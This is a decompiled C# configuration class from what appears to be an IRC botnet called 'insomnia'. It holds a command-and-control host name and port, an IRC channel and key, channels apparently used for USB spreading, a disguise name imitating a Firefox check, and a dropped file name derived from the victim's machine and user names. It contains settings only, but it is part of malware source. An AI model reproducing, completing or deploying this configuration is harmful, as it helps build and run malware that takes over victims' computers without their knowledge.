using System;
using System.Diagnostics;
using System.Text;

namespace insomnia;

internal class Class26
{
	public static string Field21 = Convert.ToBase64String(Encoding.UTF8.GetBytes(Environment.MachineName + Environment.UserName + "insomnia")).Replace("=", "").Substring(0, 7)
		.ToLower() + ".exe";

	public static string Field20 = Process.GetCurrentProcess().MainModule!.FileName;

	public static string Field19 = "Abuser";

	public static string Field18 = Class39.Method21();

	public static string Field17 = "1.1.3a";

	public static string Field16 = Class39.Method15(Field20);

	public static bool Field15 = false;

	public static bool Field14 = true;

	public static string Field13 = "8Dhskj2san20dijk5";

	public static string Field12 = "18273730";

	public static string Field11 = "insomnia";

	public static string[] Field10 = new string[1] { "tippyshot.no-ip.info" };

	public static string[] Field9 = new string[1] { "" };

	public static string Field8 = "#Insomnia";

	public static string Field7 = "";

	public static int[] Field6 = new int[1] { 15474 };

	public static string Field5 = "Mozilla Firefox Check 8.0.1";

	public static string Field4 = "#usbbk";

	public static string Field3 = "#usbrk";

	public static string Field2 = Field19;

	public static string Field1 = "ctnenuf";
}
